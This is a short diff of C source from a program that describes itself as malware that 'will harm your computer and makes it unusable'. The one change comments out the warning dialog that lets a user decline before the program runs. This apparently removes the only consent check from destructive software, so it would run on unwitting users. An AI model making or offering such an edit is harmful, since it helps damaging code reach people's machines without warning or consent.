@@ -35,7 +35,7 @@ void start() {
 		}
 	} else {
 		// Another very ugly formatting
-		if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
+		//if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
 This malware will harm your computer and makes it unusable.\r\n\
 If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
 If you know what this malware does and are using a safe environment to test, \
